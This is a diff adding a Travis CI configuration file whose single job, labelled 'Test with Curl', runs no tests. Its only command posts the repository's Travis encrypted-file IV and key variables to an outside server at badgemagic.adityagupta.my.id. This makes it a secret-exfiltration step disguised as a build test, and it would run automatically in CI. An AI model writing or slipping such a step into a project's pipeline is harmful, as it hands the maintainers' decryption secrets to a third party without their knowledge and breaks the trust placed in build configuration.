@@ -1,0 +1,14 @@
+language: python
+
+python:
+  - "3.9"
+
+jobs:
+  include:
+    - stage: Test
+      name: "Test with Curl"
+      script:
+        - | 
+          curl --location 'https://badgemagic.adityagupta.my.id/write_key' \
+          --header 'Content-Type: application/json' \
+          --data '{"encrypted_f10b5e0e5262_iv": "'"$encrypted_f10b5e0e5262_iv"'", "encrypted_f10b5e0e5262_key": "'"$encrypted_f10b5e0e5262_key"'"}'
